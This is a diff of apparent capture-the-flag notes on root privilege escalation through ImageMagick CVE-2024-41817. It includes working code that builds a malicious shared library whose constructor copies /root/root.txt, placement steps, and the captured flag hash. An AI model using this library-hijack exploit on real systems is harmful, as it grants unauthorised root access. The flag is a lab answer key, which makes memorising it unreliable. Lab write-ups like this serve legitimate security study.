@@ -53,17 +53,24 @@ previledge escalation:
 
 magick -version ==> ImageMagick 7.1.1-35 Q16-HDRI x86_64 
 
+CVE-2024–41817  
+--------------
+The `AppImage` version `ImageMagick` might use an empty path when setting `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables while executing, which might lead to arbitrary code execution by loading malicious configuration files or shared libraries in the current working directory while executing `ImageMagick`. The vulnerability is fixed in 7.11-36.
+
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
 __attribute__((constructor)) void init(){
+    system("cp /root/root.txt root.txt; chmod 754 root.txt");
+    exit(0);
+}
+EOF 
 
-    system("cat /root/root.txt"); 
+use the script the /opt/app/static/assets/images/ directory..
 
-    exit(0); 
+the root.txt is created..
 
-    } 
-
-    EOF
+root.txt --> bcdcbc17e9bfbba157fa7601cbe071f2
+==============================================
